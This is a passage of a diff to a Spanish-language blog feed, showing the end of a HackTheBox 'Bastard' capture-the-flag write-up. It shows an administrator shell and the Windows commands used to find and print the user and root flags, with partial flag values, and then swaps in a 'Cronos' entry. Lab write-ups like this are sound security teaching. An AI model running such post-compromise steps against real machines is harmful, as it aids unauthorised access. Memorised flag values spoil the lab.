-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#OUTPUT&lt;/span&gt;
-C:&lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami
-&lt;/span&gt;bastard&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;dministrator 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;¡Listo! Logramos una shell con un usuario administrador.&lt;/p&gt;
-
-&lt;h2 id=&quot;flags&quot;&gt;FLAGS&lt;/h2&gt;
-
-&lt;p&gt;Lo único que nos queda es leer las banderas de user y root. Pueden ver la flag con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;type&lt;/code&gt;, pero para hacerlo más retador solo dejaré los primeros 10 caracteres de la flag.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#USER&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;C:&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; /r/s user.txt
-C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\d&lt;/span&gt;imitris&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;ser.txt
-&lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt; /P &lt;span class=&quot;nv&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;lt;&lt;span class=&quot;s2&quot;&gt;&quot;C:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;sers&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\d&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;imitris&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;esktop&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ser.txt&quot;&lt;/span&gt;
-echo.%user:~0,10%
-ba22fde193
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; /r/s root.txt
-C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;oot.txt
-&lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt; /P &lt;span class=&quot;nv&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;lt;&lt;span class=&quot;s2&quot;&gt;&quot;C:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;sers&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;dministrator&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;esktop&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;oot.txt&quot;&lt;/span&gt;
-echo.%root:~0,10%
-4bf12b963d
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;¡Hemos logrado completar la máquina &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bastard&lt;/code&gt; de HackTheBox!&lt;/p&gt;
-
-&lt;p style=&quot;text-align: center;&quot;&gt;
-&lt;img src=&quot;/assets/images/bastard/03-finish.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;&lt;em&gt;¡Que tengan un buen día en el planeta donde se encuentren!&lt;/em&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Nos vemos en otro bit.&lt;/strong&gt;&lt;/p&gt;</content><author><name>BAST1ANT1C</name></author><category term="Writeup" /><category term="Bastard" /><summary type="html">Vamos a resolver la máquina Bastard de HackTheBox. ¡Let's hack!</summary></entry></feed>
+&lt;p&gt;&lt;strong&gt;Nos vemos en otro bit.&lt;/strong&gt;.&lt;/p&gt;</content><author><name>BAST1ANT1C</name></author><category term="Writeup" /><category term="Cronos" /><summary type="html">Vamos a resolver la máquina cronos de HackTheBox. ¡Let's hack!</summary></entry></feed>
